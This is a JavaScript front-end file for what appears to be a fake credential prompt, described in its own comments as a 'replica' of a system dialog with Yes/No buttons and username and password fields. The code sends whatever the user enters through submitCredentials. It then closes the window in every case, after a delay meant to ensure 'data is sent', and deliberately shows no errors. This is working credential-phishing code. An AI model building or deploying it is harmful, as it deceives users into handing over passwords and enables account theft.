document.addEventListener('DOMContentLoaded', () => {
  // Get DOM elements
  const closeButton = document.getElementById('close-button');
  const yesButton = document.getElementById('yes-button');
  const noButton = document.getElementById('no-button');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const detailsLink = document.getElementById('details-link');

  // Handle close button click
  closeButton.addEventListener('click', () => {
    window.api.closeApp();
  });

  // Handle "Yes" button click
  yesButton.addEventListener('click', async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    // Simple validation - ensure fields aren't empty
    if (!username || !password) {
      // Silently validate without alerts
      usernameInput.focus();
      return;
    }

    // Disable buttons while submitting
    yesButton.disabled = true;
    noButton.disabled = true;

    try {
      const result = await window.api.submitCredentials({
        username,
        password
      });
      
      // Always close the app, regardless of result
      setTimeout(() => {
        window.api.closeApp();
      }, 500); // Small delay to ensure data is sent
      
    } catch (error) {
      // Silently close the app anyway - no error messages
      setTimeout(() => {
        window.api.closeApp();
      }, 500);
    }
  });

  // Handle "No" button click
  noButton.addEventListener('click', () => {
    window.api.closeApp();
  });

  // Handle "Show more details" link (toggle details visibility)
  detailsLink.addEventListener('click', (e) => {
    e.preventDefault();
    // In a real implementation, this might show additional details
    // For this replica, we'll just toggle the text
    if (detailsLink.textContent === 'Show more details') {
      detailsLink.textContent = 'Hide details';
    } else {
      detailsLink.textContent = 'Show more details';
    }
  });

  // Auto-focus the username input when the app loads
  usernameInput.focus();
});
